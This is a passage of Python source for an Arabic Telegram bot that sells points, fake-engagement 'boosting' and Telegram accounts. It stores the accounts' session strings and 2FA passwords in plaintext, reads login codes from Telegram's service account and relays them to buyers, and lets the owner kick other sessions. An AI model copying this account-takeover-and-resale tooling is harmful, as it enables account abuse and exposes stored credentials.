            f"📱 *استبدال الأرقام الآن: {status}*\n\n"
            f"{'المستخدمون يستطيعون الآن شراء أرقام تيلغرام بالنقاط.' if new_val == '1' else 'زر شراء الرقم مغلق أمام جميع المستخدمين حتى تعيد تفعيله.'}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if data == "os:stats" and is_own:
        with db_conn() as c:
            total_users     = c.execute("SELECT COUNT(*) as cnt FROM users").fetchone()["cnt"]
            verified_users  = c.execute("SELECT COUNT(*) as cnt FROM users WHERE verified=1").fetchone()["cnt"]
            total_orders    = c.execute("SELECT COUNT(*) as cnt FROM orders").fetchone()["cnt"]
            pending_orders  = c.execute("SELECT COUNT(*) as cnt FROM orders WHERE status='pending'").fetchone()["cnt"]
            completed_orders = c.execute("SELECT COUNT(*) as cnt FROM orders WHERE status='completed'").fetchone()["cnt"]
            cancelled_orders = c.execute("SELECT COUNT(*) as cnt FROM orders WHERE status='cancelled'").fetchone()["cnt"]
            total_pts       = c.execute("SELECT SUM(points) as s FROM users").fetchone()["s"] or 0
            total_promos    = c.execute("SELECT COUNT(*) as cnt FROM promo_codes WHERE active=1").fetchone()["cnt"]
            active_mandatory = c.execute(
                "SELECT COUNT(*) as cnt FROM mandatory_channels WHERE active=1 AND funding_type='mandatory'"
            ).fetchone()["cnt"]
            queued_mandatory = c.execute(
                "SELECT COUNT(*) as cnt FROM mandatory_channels WHERE queued=1 AND funding_type='mandatory'"
            ).fetchone()["cnt"]
            active_fundings = c.execute(
                "SELECT COUNT(*) as cnt FROM channel_funding WHERE status='active'"
            ).fetchone()["cnt"]
            top_referrers = c.execute(
                "SELECT invited_by, COUNT(*) as cnt FROM users "
                "WHERE invited_by IS NOT NULL AND invited_by != 0 AND referral_credited=1 "
                "GROUP BY invited_by ORDER BY cnt DESC LIMIT 5"
            ).fetchall()

        lines = [
            "📊 *إحصائيات البوت:*\n",
            f"👥 إجمالي المستخدمين: {total_users}",
            f"✅ المستخدمون المتحققون: {verified_users}\n",
            f"📦 إجمالي الطلبات: {total_orders}",
            f"🟡 الطلبات الحالية (قيد التنفيذ): {pending_orders}",
            f"🟢 الطلبات المكتملة: {completed_orders}",
            f"🔴 الطلبات الملغاة: {cancelled_orders}\n",
            f"💰 إجمالي النقاط في البوت: {total_pts}",
            f"🎟 أكواد ترويجية نشطة: {total_promos}\n",
            f"📡 قنوات إجبارية نشطة: {active_mandatory} (⏳ بانتظار الدور: {queued_mandatory})",
            f"💸 تمويلات قنوات نشطة حالياً: {active_fundings}\n",
        ]

        if top_referrers:
            lines.append("🏆 *الأكثر دعوةً للأصدقاء:*")
            for i, r in enumerate(top_referrers, start=1):
                inviter = get_user(r["invited_by"])
                if inviter and inviter.get("username"):
                    name = md_escape(f"@{inviter['username']}")
                elif inviter and inviter.get("full_name"):
                    name = md_escape(inviter["full_name"])
                else:
                    name = f"ID {r['invited_by']}"
                lines.append(f"{i}. {name} — {r['cnt']} دعوة")
        else:
            lines.append("🏆 لا توجد دعوات مكتملة بعد.")

        await q.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    # ── رصيد مواقع الرشق (مالك) ──
    if data == "os:site_balance" and is_own:
        await q.edit_message_text("⏳ جارٍ الاستعلام عن رصيدك في المواقع...")
        lines = ["💵 *رصيد حساباتك في مواقع الرشق:*\n"]
        for panel_id, site in PANEL_MAP.items():
            res = smm_request("balance", panel=panel_id)
            if "error" in res:
                lines.append(f"❌ *{site['name']}*: تعذّر الاتصال ({res['error']})")
                continue
            balance  = res.get("balance", "غير معروف")
            currency = res.get("currency", "USD")
            lines.append(f"🌐 *{site['name']}*: {balance} {currency}")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_kb("owner_settings")
        )
        return

    # ── إدارة باقات الاستبدال بنجوم (مالك) ──
    if data == "os:manage_star_packages" and is_own:
        with db_conn() as c:
            packages = c.execute("SELECT * FROM exchange_star_packages ORDER BY stars").fetchall()
        rate = int(get_setting("exchange_star_rate") or "2000")
        lines = ["📦 *باقات الاستبدال بنجوم:*\n"]
        for pkg in packages:
            status = "✅" if pkg["active"] else "❌"
            cost = pkg["stars"] * rate
            lines.append(f"{status} {pkg['stars']} نجمة = {cost} نقطة")
        rows = []
        for pkg in packages:
            tog = "❌ تعطيل" if pkg["active"] else "✅ تفعيل"
            rows.append([
                InlineKeyboardButton(f"⭐ {pkg['stars']} نجمة", callback_data="noop"),
                InlineKeyboardButton(tog, callback_data=f"os_tog_pkg:{pkg['id']}:{0 if pkg['active'] else 1}"),
                InlineKeyboardButton("🗑", callback_data=f"os_del_pkg:{pkg['id']}")
            ])
        rows.append([InlineKeyboardButton("➕ إضافة باقة", callback_data="os_add_pkg")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        msg = "\n".join(lines) if len(packages) > 0 else "⭐ لا توجد باقات بعد. اضغط ➕ لإضافة باقة."
        await q.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "os_add_pkg" and is_own:
        context.user_data["state"] = "os_await_pkg_stars"
        await q.edit_message_text("⭐ *إضافة باقة جديدة*\n\nأرسل عدد النجوم (مثال: 15):",
                                   parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("os_tog_pkg:") and is_own:
        parts = data.split(":")
        pkg_id = int(parts[1])
        val = int(parts[2])
        with db_conn() as c:
            c.execute("UPDATE exchange_star_packages SET active=? WHERE id=?", (val, pkg_id))
            packages = c.execute("SELECT * FROM exchange_star_packages ORDER BY stars").fetchall()
        await q.answer("✅ تم التحديث")
        rate = int(get_setting("exchange_star_rate") or "2000")
        lines = ["📦 *باقات الاستبدال بنجوم:*\n"]
        for pkg in packages:
            status = "✅" if pkg["active"] else "❌"
            cost = pkg["stars"] * rate
            lines.append(f"{status} {pkg['stars']} نجمة = {cost} نقطة")
        rows = []
        for pkg in packages:
            tog = "❌ تعطيل" if pkg["active"] else "✅ تفعيل"
            rows.append([
                InlineKeyboardButton(f"⭐ {pkg['stars']} نجمة", callback_data="noop"),
                InlineKeyboardButton(tog, callback_data=f"os_tog_pkg:{pkg['id']}:{0 if pkg['active'] else 1}"),
                InlineKeyboardButton("🗑", callback_data=f"os_del_pkg:{pkg['id']}")
            ])
        rows.append([InlineKeyboardButton("➕ إضافة باقة", callback_data="os_add_pkg")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        msg = "\n".join(lines) if len(packages) > 0 else "⭐ لا توجد باقات بعد."
        await q.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("os_del_pkg:") and is_own:
        pkg_id = int(data.split(":")[1])
        with db_conn() as c:
            c.execute("DELETE FROM exchange_star_packages WHERE id=?", (pkg_id,))
        await q.answer("🗑 تم الحذف")
        return

    # ── استبدال بجائزة مخصصة ──
    if data.startswith("exchange:custom:"):
        parts = data.split(":")
        prize_id = int(parts[2])
        confirmed = len(parts) > 3 and parts[3] == "confirm"
        with db_conn() as c:
            prize = c.execute(
                "SELECT * FROM custom_prizes WHERE id=%s AND active=1", (prize_id,)
            ).fetchone()
        if not prize:
            await q.edit_message_text("⚠️ هذه الجائزة لم تعد متاحة.", reply_markup=back_kb("exchange_points"))
            return
        cost = prize["points_cost"]
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        qty_txt = f" × {prize['quantity']}" if prize["quantity"] and prize["quantity"] > 1 else ""

        if not confirmed:
            # ── شاشة التفاصيل والتأكيد ──
            can_afford = pts >= cost
            confirm_kb = [
                [InlineKeyboardButton(
                    "✅ تأكيد الطلب" if can_afford else "❌ رصيدك غير كافٍ",
                    callback_data=f"exchange:custom:{prize_id}:confirm" if can_afford else "noop"
                )],
                [InlineKeyboardButton("🔙 رجوع", callback_data="exchange_points")],
            ]
            await q.edit_message_text(
                f"🎁 *{prize['name']}{qty_txt}*\n\n"
                f"💰 التكلفة: *{cost:,} نقطة*\n"
                f"💎 رصيدك الحالي: {pts:,} نقطة\n\n"
                + ("✅ يمكنك الطلب — اضغط تأكيد للمتابعة." if can_afford else
                   f"❌ تحتاج {cost - pts:,} نقطة إضافية."),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(confirm_kb)
            )
            return

        # ── تنفيذ الطلب بعد التأكيد ──
        if pts < cost:
            await q.edit_message_text("❌ رصيدك غير كافٍ!", reply_markup=back_kb("exchange_points"))
            return
        if not deduct_points(user.id, cost):
            await q.edit_message_text("❌ حدث خطأ في خصم النقاط.", reply_markup=back_kb("exchange_points"))
            return
        code = next_order_code(user.id)
        with db_conn() as c:
            pe = c.execute(
                "INSERT INTO prize_exchanges (user_id,prize_type,prize_value,points_cost,status,order_code) "
                "VALUES (%s,%s,%s,%s,'pending',%s) RETURNING id",
                (user.id, "custom", f"{prize['name']}{qty_txt}", cost, code)
            ).fetchone()
        custom_msg = get_setting("exchange_success_msg") or ""
        result_kb = contact_owner_row() + [[InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]]
        await q.edit_message_text(
            f"✅ *تمت العملية بنجاح!*\n\n"
            f"🎁 الجائزة: {prize['name']}{qty_txt}\n"
            f"💰 التكلفة: {cost:,} نقطة\n\n"
            + (f"{custom_msg}\n\n" if custom_msg else "")
            + "سيتواصل معك المالك قريباً.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(result_kb)
        )
        await context.bot.send_message(
            user.id,
            f"📌 *كود عمليتك:* `{code}`",
            parse_mode=ParseMode.MARKDOWN
        )
        await notify_prize_exchange_owner(
            context, pe["id"],
            f"🎁 <b>طلب جائزة مخصصة</b>\n"
            f"👤 <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
            f"🎀 {prize['name']}{qty_txt}\n"
            f"💰 {cost:,} نقطة\n"
            f"📌 {code}"
        )
        return

    # ── إجراءات المالك على طلب استبدال: مكتمل / غير مكتمل ──
    if data.startswith("pe_complete:") and is_own:
        pe_id = int(data.split(":")[1])
        with db_conn() as c:
            pe = c.execute("SELECT * FROM prize_exchanges WHERE id=%s", (pe_id,)).fetchone()
            if not pe:
                await q.answer("⚠️ الطلب غير موجود.", show_alert=True)
                return
            if pe["status"] == "completed":
                await q.answer("✔️ هذا الطلب مكتمل مسبقاً.", show_alert=True)
                return
            c.execute("UPDATE prize_exchanges SET status='completed', owner_seen=TRUE WHERE id=%s", (pe_id,))
        try:
            await context.bot.send_message(
                pe["user_id"],
                f"🎉 *تم تسليم طلبك بنجاح!*\n\n"
                f"📌 الكود: `{pe['order_code'] or pe_id}`\n"
                f"نتمنى أن تكون راضياً عن الخدمة 🌟",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.warning(f"⚠️ فشل إشعار المستخدم {pe['user_id']} باكتمال طلب الاستبدال: {e}")
        await q.answer("✅ تم تمييز الطلب كمكتمل وإشعار الطالب.", show_alert=True)
        try:
            await q.edit_message_text(
                q.message.text_html + "\n\n✅ <b>مكتمل — تم التسليم</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        return

    if data.startswith("pe_ack:") and is_own:
        pe_id = int(data.split(":")[1])
        with db_conn() as c:
            pe = c.execute("SELECT * FROM prize_exchanges WHERE id=%s", (pe_id,)).fetchone()
        if not pe:
            await q.answer("⚠️ الطلب غير موجود.", show_alert=True)
            return
        if pe["status"] == "completed":
            await q.answer("✔️ هذا الطلب مكتمل مسبقاً.", show_alert=True)
            return
        try:
            await context.bot.send_message(
                pe["user_id"],
                "👀 لقد علم المالك بطلبك، سيعطيك حقك بأسرع وقت ممكن 🙏"
            )
        except Exception as e:
            logger.warning(f"⚠️ فشل إشعار المستخدم {pe['user_id']} بانتظار طلب الاستبدال: {e}")
        with db_conn() as _c_ack:
            _c_ack.execute("UPDATE prize_exchanges SET owner_seen=TRUE WHERE id=%s", (pe_id,))
        await q.answer("✅ تم إعلام الطالب بالانتظار.", show_alert=True)
        return

    if data.startswith("pe_seen:") and is_own:
        pe_id = int(data.split(":")[1])
        with db_conn() as c:
            c.execute("UPDATE prize_exchanges SET owner_seen=TRUE WHERE id=%s", (pe_id,))
        await q.answer("✅ تم تسجيل الاطلاع.", show_alert=True)
        try:
            await q.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass
        return

    # ── إدارة الجوائز المخصصة (المالك) ──
    if data == "os:manage_prizes" and is_own:
        with db_conn() as c:
            prizes = c.execute("SELECT * FROM custom_prizes ORDER BY id").fetchall()
        rows = []
        for p in prizes:
            st = "✅" if p["active"] else "❌"
            rows.append([
                InlineKeyboardButton(
                    f"{st} {p['name']} × {p['quantity']} — {p['points_cost']:,} نقطة",
                    callback_data=f"os:toggle_prize:{p['id']}"
                ),
                InlineKeyboardButton("🗑", callback_data=f"os:del_prize:{p['id']}")
            ])
        rows.append([InlineKeyboardButton("➕ إضافة جائزة جديدة", callback_data="os:add_prize")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        txt = "🎀 *الجوائز المخصصة:*\n\nاضغط على الجائزة لتفعيل/تعطيل · 🗑 للحذف" if prizes else "🎀 لا توجد جوائز مخصصة بعد."
        await q.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "os:add_prize" and is_own:
        context.user_data["state"] = "os_await_prize_name"
        await q.edit_message_text(
            "🎀 *إضافة جائزة مخصصة*\n\n"
            "الخطوة 1/2 — أرسل *اسم الجائزة*:\n"
            "مثال: `اسيا سيل 500` أو `بطاقة شحن`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:skip_prize_qty" and is_own:
        context.user_data["prize_qty"] = 1
        context.user_data["state"] = "os_await_prize_cost"
        name = context.user_data.get("prize_name", "")
        await q.edit_message_text(
            f"🎀 *الجائزة:* {name}\n\n"
            f"الخطوة 2/2 — أرسل *عدد النقاط* اللازمة للحصول عليها:\n"
            f"مثال: `1000`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("os:toggle_prize:") and is_own:
        pid = int(data.split(":")[2])
        with db_conn() as c:
            c.execute("UPDATE custom_prizes SET active = 1-active WHERE id=%s", (pid,))
        await q.answer("✅ تم التحديث")
        with db_conn() as c:
            prizes = c.execute("SELECT * FROM custom_prizes ORDER BY id").fetchall()
        rows = []
        for p in prizes:
            st = "✅" if p["active"] else "❌"
            rows.append([
                InlineKeyboardButton(
                    f"{st} {p['name']} × {p['quantity']} — {p['points_cost']:,} نقطة",
                    callback_data=f"os:toggle_prize:{p['id']}"
                ),
                InlineKeyboardButton("🗑", callback_data=f"os:del_prize:{p['id']}")
            ])
        rows.append([InlineKeyboardButton("➕ إضافة جائزة جديدة", callback_data="os:add_prize")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("os:del_prize:") and is_own:
        pid = int(data.split(":")[2])
        with db_conn() as c:
            c.execute("DELETE FROM custom_prizes WHERE id=%s", (pid,))
        await q.answer("🗑 تم الحذف")
        with db_conn() as c:
            prizes = c.execute("SELECT * FROM custom_prizes ORDER BY id").fetchall()
        rows = []
        for p in prizes:
            st = "✅" if p["active"] else "❌"
            rows.append([
                InlineKeyboardButton(
                    f"{st} {p['name']} × {p['quantity']} — {p['points_cost']:,} نقطة",
                    callback_data=f"os:toggle_prize:{p['id']}"
                ),
                InlineKeyboardButton("🗑", callback_data=f"os:del_prize:{p['id']}")
            ])
        rows.append([InlineKeyboardButton("➕ إضافة جائزة جديدة", callback_data="os:add_prize")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        txt = "🎀 *الجوائز المخصصة:*\n\nاضغط على الجائزة لتفعيل/تعطيل · 🗑 للحذف" if prizes else "🎀 لا توجد جوائز مخصصة بعد."
        await q.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(rows))
        return

    # ─── زر المشتري: طلب كود الدخول ───
    if data.startswith("buyer:request_code:"):
        number_for_code = data[len("buyer:request_code:"):]
        import datetime as _dt_rc

        # ── جلب وقت الشراء + جلسة الرقم من DB ──
        _purchase_time = None
        _session_str_rc = None
        try:
            with db_conn() as _rdb:
                _rrow = _rdb.execute(
                    """SELECT pe.created_at, ns.session_string
                       FROM prize_exchanges pe
                       JOIN number_stock ns ON ns.phone_number = pe.prize_value
                       WHERE pe.prize_value=%s AND pe.user_id=%s AND pe.status='completed'
                       ORDER BY pe.created_at DESC LIMIT 1""",
                    (number_for_code, user.id)
                ).fetchone()
            if _rrow:
                _session_str_rc = _rrow["session_string"]
                try:
                    _purchase_time = _dt_rc.datetime.fromisoformat(str(_rrow["created_at"]).replace("Z", "+00:00"))
                    if _purchase_time.tzinfo is None:
                        _purchase_time = _purchase_time.replace(tzinfo=_dt_rc.timezone.utc)
                except Exception:
                    _purchase_time = None
        except Exception:
            pass

        if not _session_str_rc:
            # ── fallback: شراء بكود تجريبي (لا يُسجَّل في prize_exchanges) ──
            _demo_entry = _demo_purchases.get(user.id)
            if _demo_entry and _demo_entry.get("phone") == number_for_code:
                _session_str_rc = _demo_entry["session_str"]
                _purchase_time  = _demo_entry["purchase_time"]
            else:
                await q.answer("❌ لا يوجد رقم مشترى باسمك بهذا الرقم.", show_alert=True)
                return

        async def _send_code_msg(code_val: str):
            """يرسل كود الدخول فقط — رمز 2FA يُطلب بزر منفصل."""
            await q.answer("✅ تم إرسال الكود أدناه", show_alert=False)
            await context.bot.send_message(
                chat_id=user.id,
                text=(
                    f"🔑 *كود الدخول*\n\n"
                    f"`{code_val}`\n\n"
                    f"📱 للرقم: `{number_for_code.lstrip('+')}`\n\n"
                    f"⚠️ لا تشاركه مع أحد — صالح لدقائق فقط."
                ),
                parse_mode=ParseMode.MARKDOWN,
            )

        # 1️⃣ الذاكرة المؤقتة — يُقبل الكود فقط إن وصل بعد وقت الشراء
        entry = _buyer_received_codes.get(user.id)
        if entry and entry.get("phone") == number_for_code:
            code_time = entry.get("time", 0)
            purchase_ts = _purchase_time.timestamp() if _purchase_time else 0
            if code_time >= purchase_ts:
                await _send_code_msg(entry["code"])
                return

        # 2️⃣ جلب الكود من 777000 مباشرةً — يُشترط أن يكون بعد وقت الشراء
        fetched_code = None
        try:
            if TELEGRAM_API_ID and TELEGRAM_API_HASH:
                _fcli = TelegramClient(
                    StringSession(_session_str_rc),
                    int(TELEGRAM_API_ID), TELEGRAM_API_HASH
                )
                await asyncio.wait_for(_fcli.connect(), timeout=15)
                try:
                    if await asyncio.wait_for(_fcli.is_user_authorized(), timeout=8):
                        # after_date = وقت الشراء ← لا يُقبل أي كود قبله
                        raw_msg, _raw_msg_date = await fetch_last_login_code(_fcli, after_date=_purchase_time)
                        if raw_msg:
                            _m5 = re.search(r'\b(\d{5})\b', raw_msg)   # 5 أرقام بالضبط
                            if not _m5:
                                _m5 = re.search(r'(\d{4,7})', raw_msg)  # fallback
                            if _m5:
                                fetched_code = _m5.group(1)
                finally:
                    try:
                        await _fcli.disconnect()
                    except Exception:
                        pass
        except Exception as _fe:
            logger.warning(f"⚠️ تعذّر جلب كود الدخول للرقم {number_for_code}: {_fe}")

        if fetched_code:
            _buyer_received_codes[user.id] = {
                "code": fetched_code, "time": time.time(), "phone": number_for_code
            }
            await _send_code_msg(fetched_code)
        else:
            await q.answer(
                "⏳ لم يصل أي كود بعد.\n\n"
                "افتح تيليجرام على جهازك، أدخل الرقم واطلب كود الدخول، ثم اضغط الزر مجدداً.",
                show_alert=True
            )
        return

    if data.startswith("buyer:show_twofa:"):
        twofa_phone = data[len("buyer:show_twofa:"):]
        try:
            with db_conn() as _twdb:
                # نتحقق من الملكية عبر prize_exchanges بدلاً من assigned_to الذي قد يتغير
                _twrow = _twdb.execute(
                    """SELECT ns.twofa_password FROM number_stock ns
                       WHERE ns.phone_number=%s
                         AND EXISTS (
                             SELECT 1 FROM prize_exchanges pe
                             WHERE pe.prize_value=%s
                               AND pe.user_id=%s
                               AND pe.status='completed'
                         )""",
                    (twofa_phone, twofa_phone, user.id)
                ).fetchone()
            _twofa_val = (_twrow["twofa_password"] or "").strip() if _twrow else ""
            # ── fallback: شراء بكود تجريبي ──
            if not _twofa_val:
                _demo_entry_twofa = _demo_purchases.get(user.id)
                if _demo_entry_twofa and _demo_entry_twofa.get("phone") == twofa_phone:
                    _twofa_val = _demo_entry_twofa.get("twofa", "")
            if _twofa_val:
                await q.answer("✅ تم إرسال رمز التحقق أدناه", show_alert=False)
                await context.bot.send_message(
                    chat_id=user.id,
                    text=(
                        f"🔐 *رمز التحقق (المصادقة الثنائية)*\n\n"
                        f"`{_twofa_val}`\n\n"
                        f"📱 للرقم: `{twofa_phone.lstrip('+')}`\n\n"
                        f"⚠️ لا تشاركه مع أحد."
                    ),
                    parse_mode=ParseMode.MARKDOWN,
                )
            else:
                await q.answer("⚠️ لا يوجد رمز تحقق ثنائي مضبوط لهذا الرقم.", show_alert=True)
        except Exception as _twe:
            logger.warning(f"⚠️ خطأ في جلب رمز التحقق: {_twe}")
            await q.answer("❌ حدث خطأ. حاول مجدداً.", show_alert=True)
        return

    if data == "buyer:stay_account":
        await q.answer("✅ البوت سيبقى متصلاً بالحساب.", show_alert=True)
        return

    if data.startswith("buyer:leave_account:"):
        leave_phone = data[len("buyer:leave_account:"):]
        # تحقق أن هذا المستخدم هو فعلاً مشتري هذا الرقم
        # نتحقق من prize_exchanges أيضاً للتعامل مع حالة أن auto-leave سبق وأفرغ assigned_to
        with db_conn() as c_lv:
            row_lv = c_lv.execute(
                "SELECT id, session_string, assigned_to FROM number_stock WHERE phone_number=%s", (leave_phone,)
            ).fetchone()
            was_buyer = c_lv.execute(
                "SELECT id FROM prize_exchanges WHERE user_id=%s AND prize_value=%s "
                "AND prize_type IN ('telegram_number','telegram_number_code') AND status='completed'",
                (user.id, leave_phone)
            ).fetchone()
        if not row_lv or (row_lv["assigned_to"] != user.id and not was_buyer):
            await q.answer("⚠️ لا تملك صلاحية تنفيذ هذا الإجراء.", show_alert=True)
            return
        # إجراء المغادرة: إيقاف المراقبة وقطع اتصال البوت نهائياً
        try:
            await _stop_number_monitor(leave_phone)
        except Exception as _le2:
            logger.warning(f"⚠️ تعذّر إيقاف مراقبة الرقم {leave_phone}: {_le2}")
        with db_conn() as c_lv2:
            c_lv2.execute(
                "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, force_listed=FALSE "
                "WHERE phone_number=%s", (leave_phone,)
            )
        # حذف الكود المخزون للمشتري
        _buyer_received_codes.pop(user.id, None)
        await q.edit_message_text(
            "✅ *تم.* البوت غادر الحساب وحذف جلسته.\n\nشكراً لاستخدامك الخدمة 🤍",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "noop":
        return

    # ══════════════════════════════════════════════════════════
    #  الحسابات المبيوعة — عرض كامل للمالك
    # ══════════════════════════════════════════════════════════
    if data == "os:sold_accounts" and is_own:
        with db_conn() as c:
            # الحسابات المبيوعة حالياً (لها مشترٍ نشط)
            active_sold = c.execute(
                "SELECT ns.id, ns.phone_number, ns.assigned_to, ns.assigned_at, ns.ever_sold, "
                "       pe.order_code, pe.created_at AS sale_date, pe.points_cost, "
                "       u.full_name AS buyer_name "
                "FROM number_stock ns "
                "LEFT JOIN prize_exchanges pe ON pe.prize_value = ns.phone_number "
                "     AND pe.status = 'completed' "
                "     AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "LEFT JOIN users u ON u.user_id = ns.assigned_to "
                "WHERE ns.assigned_to IS NOT NULL AND ns.deleted_at IS NULL "
                "ORDER BY ns.assigned_at DESC LIMIT 50"
            ).fetchall()

            # الحسابات التي بيعت ولا يوجد مشترٍ نشط الآن (ever_sold=TRUE لكن assigned_to IS NULL)
            past_sold = c.execute(
                "SELECT ns.id, ns.phone_number, ns.ever_sold, "
                "       pe.order_code, pe.created_at AS sale_date, pe.user_id AS buyer_id, "
                "       pe.points_cost, u.full_name AS buyer_name "
                "FROM number_stock ns "
                "LEFT JOIN prize_exchanges pe ON pe.prize_value = ns.phone_number "
                "     AND pe.status = 'completed' "
                "     AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "LEFT JOIN users u ON u.user_id = pe.user_id "
                "WHERE ns.ever_sold IS TRUE AND ns.assigned_to IS NULL AND ns.deleted_at IS NULL "
                "ORDER BY pe.created_at DESC NULLS LAST LIMIT 30"
            ).fetchall()

            # فحص: هل يوجد حساب بيع لأكثر من شخص؟
            dupes_check = c.execute(
                "SELECT prize_value, COUNT(*) AS cnt "
                "FROM prize_exchanges "
                "WHERE prize_type IN ('telegram_number','telegram_number_code') "
                "  AND prize_value NOT IN ('number','manual') "
                "  AND status IN ('completed','duplicate_compensated') "
                "GROUP BY prize_value HAVING COUNT(*) > 1"
            ).fetchall()

        def _fmt_dt(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]

        lines = ["🛒 *الحسابات المبيوعة*\n"]

        if active_sold:
            lines.append(f"🟢 *نشطة الآن ({len(active_sold)})*")
            for r in active_sold:
                buyer_name = r["buyer_name"] or f"ID:{r['assigned_to']}"
                lines.append(
                    f"📱 `{r['phone_number']}`\n"
                    f"   👤 المشتري: {buyer_name} (`{r['assigned_to']}`)\n"
                    f"   📅 تاريخ البيع: {_fmt_dt(r['assigned_at'])}\n"
                    f"   📌 كود: {r['order_code'] or '—'}"
                )
        else:
            lines.append("🟢 *نشطة الآن:* لا يوجد حالياً")

        lines.append("")

        if past_sold:
            lines.append(f"⬜ *مبيوعة سابقاً — البوت غادرها ({len(past_sold)})*")
            for r in past_sold:
                buyer_name = r["buyer_name"] or f"ID:{r.get('buyer_id','?')}"
                lines.append(
                    f"📱 `{r['phone_number']}`\n"
                    f"   👤 المشتري: {buyer_name}\n"
                    f"   📅 تاريخ البيع: {_fmt_dt(r['sale_date'])}\n"
                    f"   📌 كود: {r['order_code'] or '—'}"
                )
        else:
            lines.append("⬜ *مبيوعة سابقاً:* لا يوجد")

        if dupes_check:
            lines.append("")
            lines.append(f"⚠️ *حسابات بيعت أكثر من مرة ({len(dupes_check)}):*")
            for d in dupes_check:
                lines.append(f"📱 `{d['prize_value']}` — بيعت {d['cnt']} مرة")

        text = "\n".join(lines)
        # تقسيم الرسالة إن طالت
        if len(text) > 4000:
            text = text[:3950] + "\n\n_(قُطع لطول القائمة)_"

        # أزرار التفاصيل لكل حساب نشط
        detail_rows = []
        for r in active_sold:
            detail_rows.append([InlineKeyboardButton(
                f"📋 {r['phone_number']}",
                callback_data=f"os:sold_detail:{r['id']}"
            )])

        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(
                detail_rows + [
                    [InlineKeyboardButton("🔍 بحث برقم", callback_data="os:sold_search"),
                     InlineKeyboardButton("🧾 تحقق بكود", callback_data="os:sold_code_search")],
                    [InlineKeyboardButton("⚠️ العمليات الفاشلة", callback_data="os:failed_deliveries")],
                    [InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")],
                ]
            )
        )
        return

    # ══════════════════════════════════════════════════════════
    #  تفاصيل حساب مباع — صفحة الإجراءات
    # ══════════════════════════════════════════════════════════
    if data.startswith("os:sold_detail:") and is_own:
        stock_id = int(data.split(":")[-1])
        with db_conn() as _c:
            rec = _c.execute(
                "SELECT ns.id, ns.phone_number, ns.session_string, ns.assigned_to, ns.assigned_at, "
                "       ns.twofa_password, pe.order_code, pe.created_at AS sale_date, "
                "       u.full_name AS buyer_name "
                "FROM number_stock ns "
                "LEFT JOIN prize_exchanges pe ON pe.prize_value = ns.phone_number "
                "     AND pe.status = 'completed' "
                "     AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "LEFT JOIN users u ON u.user_id = ns.assigned_to "
                "WHERE ns.id=%s",
                (stock_id,)
            ).fetchone()
        if not rec:
            await q.edit_message_text("⚠️ لم يُعثر على الحساب.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        rec = dict(rec)
        def _fd(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]
        has_session = bool(rec.get("session_string"))
        buyer_name  = rec.get("buyer_name") or f"ID:{rec.get('assigned_to', '?')}"
        saved_2fa   = rec.get("twofa_password") or "—"
        info = (
            f"📱 *{rec['phone_number']}*\n\n"
            f"👤 المشتري: {buyer_name} (`{rec.get('assigned_to', '—')}`)\n"
            f"📅 تاريخ البيع: {_fd(rec.get('assigned_at'))}\n"
            f"📌 كود الطلب: {rec.get('order_code') or '—'}\n"
            f"🗝 كلمة مرور 2FA: `{saved_2fa}`\n"
            f"📡 جلسة بوت: {'✅ نشطة' if has_session else '❌ لا يوجد'}"
        )
        action_btns = []
        if has_session:
            action_btns += [
                [InlineKeyboardButton("🔑 جلب آخر كود وصل", callback_data=f"os:sold_code:{stock_id}")],
                [InlineKeyboardButton("🚫 طرد جميع الجلسات الأخرى", callback_data=f"os:sold_kick:{stock_id}")],
                [InlineKeyboardButton("🔐 تغيير/عرض 2FA", callback_data=f"os:sold_2fa:{stock_id}")],
                [InlineKeyboardButton("🚪 تسجيل خروج البوت", callback_data=f"os:sold_logout:{stock_id}")],
            ]
        action_btns.append([InlineKeyboardButton("🔙 رجوع للمبيوعات", callback_data="os:sold_accounts")])
